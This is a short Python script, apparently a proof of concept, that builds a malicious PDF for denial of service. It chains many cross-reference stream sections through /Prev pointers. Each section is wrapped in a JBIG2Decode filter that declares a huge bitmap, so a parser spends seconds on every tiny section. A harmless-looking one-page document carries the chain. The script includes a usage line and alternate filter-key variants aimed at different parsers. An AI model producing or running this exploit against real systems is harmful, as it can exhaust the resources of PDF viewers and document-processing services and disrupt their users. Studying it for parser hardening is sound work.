# N older xref-stream sections chained by /Prev, each behind /Filter /JBIG2Decode whose page-info
# segment declares a W x H bitmap (the decoder allocates and clears all of it before the first byte
# comes out): a ~120 byte section costs seconds. The main section is a plain xref stream.
# usage: jbig2chain.py out.pdf N W H [Filter|F|FilterNullF]  (the key the stream builder reads the filter from)
import struct
import sys

out_path = sys.argv[1]
N, W, H = int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
key = sys.argv[5] if len(sys.argv) > 5 else "Filter"
filt = {"Filter": b"/Filter /JBIG2Decode", "F": b"/F /JBIG2Decode", "FilterNullF": b"/Filter null /F /JBIG2Decode"}[key]
content = b"BT /F1 24 Tf 72 700 Td (Record quarter) Tj ET"
objs = {
    1: b"<< /Type /Catalog /Pages 2 0 R >>",
    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
    4: b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
    5: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
}
out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
off = {}
for n in sorted(objs):
    off[n] = len(out)
    out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
page_info = struct.pack(">IIIIBH", W, H, 0, 0, 0, 0)
seg = struct.pack(">IBBBI", 0, 48, 0, 1, len(page_info)) + page_info
prev = None
num = 100
for _ in range(N):
    at = len(out)
    d = b"<< /Type /XRef /Size 6 /Index [4 1] /W [1 1 1] %s /Length %d" % (filt, len(seg))
    if prev is not None:
        d += b" /Prev %d" % prev
    d += b" >>"
    out += b"%d 0 obj\n" % num + d + b"\nstream\n" + seg + b"\nendstream\nendobj\n"
    prev = at
    num += 1
main = len(out)
rows = b"\x00\x00\x00\x00\x00\xff" + b"".join(bytes([1]) + struct.pack(">I", off[n]) + b"\x00" for n in (1, 2, 3, 4, 5))
d = b"<< /Type /XRef /Size 6 /W [1 4 1] /Root 1 0 R /Prev %d /Length %d >>" % (prev, len(rows))
out += b"%d 0 obj\n" % num + d + b"\nstream\n" + rows + b"\nendstream\nendobj\n"
out += b"startxref\n%d\n%%%%EOF\n" % main
open(out_path, "wb").write(out)
